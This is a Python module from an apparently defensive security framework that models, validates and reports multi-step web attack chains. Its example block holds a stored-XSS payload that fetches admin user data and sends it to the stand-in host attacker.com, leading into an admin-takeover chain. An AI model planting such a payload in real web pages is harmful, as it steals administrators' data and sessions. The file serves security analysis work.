#!/usr/bin/env python3
"""
Attack Chain Analyzer - Core Chain Analysis Module
Author: Victor Ibhafidon

This is the PRIMARY module of the framework - the heart of attack chain analysis.
It provides tools for building, validating, and managing multi-step attack chains.

WHAT IT DOES:
- Creates and manages AttackChain objects with multiple ChainStep objects
- Validates chain logic (prerequisites, outcomes, step numbering)
- Provides fuzzy matching for prerequisite validation
- Exports/imports chains to/from JSON
- Integrates with visualizer.py for diagram generation

HOW IT CONNECTS TO THE FRAMEWORK:
- Uses framework.py's SecurityFinding for storing findings
- Outputs to visualizer.py for diagram generation
- Used by target-specific modules (juice-shop, robotics, etc.)
- Chains are stored as JSON files for persistence
- Validation ensures chains are logically sound before use

USAGE:
 from chains.chain_analyzer import ChainAnalyzer, ChainStep, VulnerabilityType, ImpactLevel
 
 analyzer = ChainAnalyzer()
 chain = analyzer.create_chain("XSS to Admin", "...", ImpactLevel.CRITICAL)
 step1 = ChainStep(1, VulnerabilityType.XSS, "XSS in profile", outcome="XSS stored")
 chain.add_step(step1)
 is_valid, issues = chain.validate_chain()
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from enum import Enum
from datetime import datetime
import json

class VulnerabilityType(Enum):
 """Types of vulnerabilities that can be chained"""
 XSS = "Cross-Site Scripting"
 SQL_INJECTION = "SQL Injection"
 IDOR = "Insecure Direct Object Reference"
 SSRF = "Server-Side Request Forgery"
 CSRF = "Cross-Site Request Forgery"
 AUTH_BYPASS = "Authentication Bypass"
 SESSION_HIJACKING = "Session Hijacking"
 PRIV_ESCALATION = "Privilege Escalation"
 RCE = "Remote Code Execution"
 XXE = "XML External Entity"
 DESERIALIZATION = "Insecure Deserialization"
 PATH_TRAVERSAL = "Path Traversal"
 BUSINESS_LOGIC = "Business Logic Flaw"
 OTHER = "Other"

class ImpactLevel(Enum):
 """Impact levels for attack chains"""
 LOW = "Low"
 MEDIUM = "Medium"
 HIGH = "High"
 CRITICAL = "Critical"

@dataclass
class ChainStep:
    """Represents a single step in an attack chain"""
    step_number: int
    vulnerability_type: VulnerabilityType
    description: str
    endpoint: Optional[str] = None
    payload: Optional[str] = None
    prerequisites: List[str] = field(default_factory=list)
    outcome: Optional[str] = None
    evidence: Optional[str] = None
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        return {
            "step_number": self.step_number,
            "vulnerability_type": self.vulnerability_type.value,
            "description": self.description,
            "endpoint": self.endpoint,
            "payload": self.payload,
            "prerequisites": self.prerequisites,
            "outcome": self.outcome,
            "evidence": self.evidence
        }

@dataclass
class AttackChain:
    """Represents a complete attack chain"""
    title: str
    description: str
    steps: List[ChainStep] = field(default_factory=list)
    impact: ImpactLevel = ImpactLevel.MEDIUM
    severity: str = ""
    prerequisites: List[str] = field(default_factory=list)
    context: Optional[str] = None
    discovered_by: Optional[str] = None
    discovered_at: Optional[datetime] = None
    validated: bool = False
    tags: Set[str] = field(default_factory=set)
    
    def __post_init__(self):
        if self.discovered_at is None:
            self.discovered_at = datetime.now()
 
 def add_step(self, step: ChainStep):
 """Add a step to the chain"""
 self.steps.append(step)
 self.steps.sort(key=lambda x: x.step_number)
 
 def get_chain_summary(self) -> str:
 """Get a summary of the attack chain"""
 summary = []
 summary.append(f"Attack Chain: {self.title}")
 summary.append(f"Impact: {self.impact.value}")
 summary.append(f"Steps: {len(self.steps)}")
 summary.append("\nChain Steps:")
 for step in self.steps:
 summary.append(f" {step.step_number}. [{step.vulnerability_type.value}] {step.description}")
 return "\n".join(summary)
 
 def validate_chain(self) -> tuple[bool, List[str]]:
 """
 Validate that the chain is logically sound with detailed error messages.
 
 This is a critical method that ensures attack chains are logically consistent:
 - Checks that all steps are numbered sequentially
 - Validates that prerequisites match outcomes from previous steps
 - Uses fuzzy matching to suggest similar outcomes when exact matches aren't found
 - Provides helpful error messages and suggestions for fixing issues
 
 Returns:
 Tuple of (is_valid, list_of_issues_and_suggestions)
 """
 issues = []
 suggestions = []
 
 # Validation 1: Check if chain has steps
 # A chain without steps is invalid - it needs at least one step
 if not self.steps:
 issues.append(" Chain has no steps - Add at least one step to create a valid chain")
 return False, issues
 
 # Validation 2: Check step numbering
 # Steps must be numbered sequentially starting from 1 (1, 2, 3, ...)
 # This ensures the chain flows logically and steps can be referenced
 step_numbers = [s.step_number for s in self.steps]
 expected_numbers = list(range(1, len(self.steps) + 1))
 if sorted(step_numbers) != expected_numbers:
 missing = [n for n in expected_numbers if n not in step_numbers]
 duplicates = [n for n in step_numbers if step_numbers.count(n) > 1]
 if missing:
 issues.append(f" Step numbers are missing: {missing}")
 if duplicates:
 issues.append(f" Duplicate step numbers found: {duplicates}")
 suggestions.append(" Fix: Ensure step numbers are sequential starting from 1 (1, 2, 3, ...)")
 
 # Validation 3: Check prerequisites with detailed matching
 # This is the core validation - ensures each step's prerequisites
 # are met by outcomes from previous steps or chain-level prerequisites
 for i, step in enumerate(self.steps):
 if step.prerequisites:
 # Collect all available outcomes from:
 # 1. Previous steps in the chain (their outcomes)
 # 2. Chain-level prerequisites (available from the start)
 previous_outcomes = [s.outcome for s in self.steps[:i] if s.outcome]
 chain_prereqs = self.prerequisites if self.prerequisites else []
 all_available = previous_outcomes + chain_prereqs
 
 # Check each prerequisite for this step
 for prereq in step.prerequisites:
 if prereq not in all_available:
 # Fuzzy matching: Try to find similar outcomes
 # This helps when prerequisites are worded slightly differently
 # but mean the same thing (e.g., "XSS stored" vs "XSS payload stored")
 prereq_lower = prereq.lower()
 similar = []
 for outcome in all_available:
 outcome_lower = outcome.lower()
 # Method 1: Check if keywords match (word overlap)
 prereq_words = set(prereq_lower.split())
 outcome_words = set(outcome_lower.split())
 # If significant overlap (50%+), consider similar
 if prereq_words and outcome_words:
 overlap = len(prereq_words & outcome_words) / len(prereq_words)
 if overlap > 0.5: # 50% word overlap threshold
 similar.append(outcome)
 # Method 2: Check substring matches
 # Handles cases like "XSS" matching "XSS stored"
 elif prereq_lower in outcome_lower or outcome_lower in prereq_lower:
 if outcome not in similar:
 similar.append(outcome)
 
 if similar:
 issues.append(
 f" Step {step.step_number}: Prerequisite '{prereq}' not found exactly, "
 f"but similar outcomes exist: {similar}"
 )
 suggestions.append(
 f" Step {step.step_number}: Consider using one of these similar outcomes instead: {similar}"
 )
 else:
 issues.append(
 f" Step {step.step_number}: Prerequisite '{prereq}' is not met. "
 f"Available outcomes from previous steps: {previous_outcomes if previous_outcomes else 'None'}"
 )
 if i > 0:
 suggestions.append(
 f" Step {step.step_number}: Ensure a previous step produces an outcome matching '{prereq}', "
 f"or add '{prereq}' to chain-level prerequisites"
 )
 else:
 suggestions.append(
 f" Step {step.step_number}: Add '{prereq}' to chain-level prerequisites "
 f"(chain.prerequisites) since this is the first step"
 )
 
 # Check for missing outcomes (steps without outcomes that are prerequisites for later steps)
 step_outcomes = {s.step_number: s.outcome for s in self.steps if s.outcome}
 for i, step in enumerate(self.steps):
 if i < len(self.steps) - 1: # Not the last step
 next_step = self.steps[i + 1]
 if next_step.prerequisites and not step.outcome:
 # Check if any prerequisite might need this step's outcome
 potential_match = any(
 any(keyword in prereq.lower() for keyword in [
 f"step {step.step_number}", 
 f"step{step.step_number}",
 step.vulnerability_type.value.lower()
 ])
 for prereq in next_step.prerequisites
 )
 if potential_match:
 suggestions.append(
 f" Step {step.step_number}: Consider adding an 'outcome' field, "
 f"as Step {next_step.step_number} may depend on it"
 )
 
 # Check for empty descriptions
 for step in self.steps:
 if not step.description or step.description.strip() == "":
 issues.append(f" Step {step.step_number}: Missing description")
 suggestions.append(f" Step {step.step_number}: Add a description explaining what this step does")
 
 # Combine issues and suggestions
 all_messages = issues + suggestions
 
 return len(issues) == 0, all_messages
 
 def to_dict(self) -> Dict:
 """Convert to dictionary for serialization"""
 return {
 "title": self.title,
 "description": self.description,
 "steps": [step.to_dict() for step in self.steps],
 "impact": self.impact.value,
 "severity": self.severity,
 "prerequisites": self.prerequisites,
 "context": self.context,
 "discovered_by": self.discovered_by,
 "discovered_at": self.discovered_at.isoformat() if self.discovered_at else None,
 "validated": self.validated,
 "tags": list(self.tags)
 }
 
 @classmethod
 def from_dict(cls, data: Dict) -> 'AttackChain':
 """Create AttackChain from dictionary"""
 chain = cls(
 title=data["title"],
 description=data["description"],
 impact=ImpactLevel(data["impact"]),
 severity=data.get("severity", ""),
 prerequisites=data.get("prerequisites", []),
 context=data.get("context"),
 discovered_by=data.get("discovered_by"),
 validated=data.get("validated", False)
 )
 if "discovered_at" in data and data["discovered_at"]:
 chain.discovered_at = datetime.fromisoformat(data["discovered_at"])
 
 for step_data in data.get("steps", []):
 step = ChainStep(
 step_number=step_data["step_number"],
 vulnerability_type=VulnerabilityType(step_data["vulnerability_type"]),
 description=step_data["description"],
 endpoint=step_data.get("endpoint"),
 payload=step_data.get("payload"),
 prerequisites=step_data.get("prerequisites", []),
 outcome=step_data.get("outcome"),
 evidence=step_data.get("evidence")
 )
 chain.add_step(step)
 
 chain.tags = set(data.get("tags", []))
 return chain

class ChainAnalyzer:
 """Main analyzer for attack chains"""
 
 def __init__(self):
 self.chains: List[AttackChain] = []
 
 def create_chain(self, title: str, description: str, impact: ImpactLevel = ImpactLevel.MEDIUM) -> AttackChain:
 """Create a new attack chain"""
 chain = AttackChain(title=title, description=description, impact=impact)
 self.chains.append(chain)
 return chain
 
 def add_step_to_chain(self, chain: AttackChain, step: ChainStep):
 """Add a step to an existing chain"""
 chain.add_step(step)
 
 def find_chains_by_vulnerability(self, vuln_type: VulnerabilityType) -> List[AttackChain]:
 """Find all chains containing a specific vulnerability type"""
 return [chain for chain in self.chains 
 if any(step.vulnerability_type == vuln_type for step in chain.steps)]
 
 def find_chains_by_tag(self, tag: str) -> List[AttackChain]:
 """Find all chains with a specific tag"""
 return [chain for chain in self.chains if tag in chain.tags]
 
 def validate_all_chains(self) -> Dict[str, tuple[bool, List[str]]]:
 """Validate all chains"""
 results = {}
 for chain in self.chains:
 is_valid, issues = chain.validate_chain()
 results[chain.title] = (is_valid, issues)
 return results
 
 def export_chain(self, chain: AttackChain, filename: str):
 """Export a chain to JSON file"""
 with open(filename, 'w') as f:
 json.dump(chain.to_dict(), f, indent=2)
 
 def import_chain(self, filename: str) -> AttackChain:
 """Import a chain from JSON file"""
 with open(filename, 'r') as f:
 data = json.load(f)
 chain = AttackChain.from_dict(data)
 self.chains.append(chain)
 return chain
 
 def generate_report(self) -> str:
 """Generate a comprehensive report of all chains"""
 report = []
 report.append("=" * 80)
 report.append("ATTACK CHAIN ANALYSIS REPORT")
 report.append("=" * 80)
 report.append(f"\nTotal Chains: {len(self.chains)}")
 
 # Group by impact
 by_impact = {}
 for chain in self.chains:
 impact = chain.impact.value
 if impact not in by_impact:
 by_impact[impact] = []
 by_impact[impact].append(chain)
 
 report.append("\nBy Impact Level:")
 for impact in ["Critical", "High", "Medium", "Low"]:
 if impact in by_impact:
 report.append(f" {impact}: {len(by_impact[impact])}")
 
 # Validation status
 validation_results = self.validate_all_chains()
 valid_count = sum(1 for is_valid, _ in validation_results.values() if is_valid)
 report.append(f"\nValidated Chains: {valid_count}/{len(self.chains)}")
 
 # Detailed chain information
 report.append("\n" + "=" * 80)
 report.append("DETAILED CHAIN INFORMATION")
 report.append("=" * 80)
 
 for chain in self.chains:
 report.append("\n" + "-" * 80)
 report.append(chain.get_chain_summary())
 is_valid, issues = chain.validate_chain()
 if not is_valid:
 report.append(f"\n Validation Issues:")
 for issue in issues:
 report.append(f" - {issue}")
 
 return "\n".join(report)

if __name__ == "__main__":
 # Example usage
 analyzer = ChainAnalyzer()
 
 # Create an example attack chain
 chain = analyzer.create_chain(
 title="XSS to Admin Takeover",
 description="Chained XSS and IDOR vulnerabilities leading to admin account compromise",
 impact=ImpactLevel.CRITICAL
 )
 
 chain.prerequisites = ["Valid user account", "Access to user profile page"]
 chain.context = "Web application with user profiles and admin panel"
 chain.tags = {"xss", "idor", "privilege-escalation", "web"}
 
 # Add steps
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.XSS,
 description="Stored XSS in user profile bio field",
 endpoint="/api/user/profile",
 payload="<script>fetch('/api/admin/users', {credentials: 'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(d))))</script>",
 outcome="XSS payload stored in victim's profile"
 )
 
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.IDOR,
 description="Admin views user profile, XSS executes in admin context",
 endpoint="/admin/users/{id}",
 prerequisites=["XSS payload stored in victim's profile"],
 outcome="Admin session hijacked, admin API credentials stolen"
 )
 
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.PRIV_ESCALATION,
 description="Use stolen admin credentials to access admin panel",
 endpoint="/admin/panel",
 prerequisites=["Admin session hijacked, admin API credentials stolen"],
 outcome="Full admin access achieved"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 # Validate and report
 is_valid, issues = chain.validate_chain()
 print(chain.get_chain_summary())
 print(f"\nChain Valid: {is_valid}")
 if issues:
 print(f"Issues: {issues}")
 
 analyzer.chains.append(chain)
 print("\n" + analyzer.generate_report())

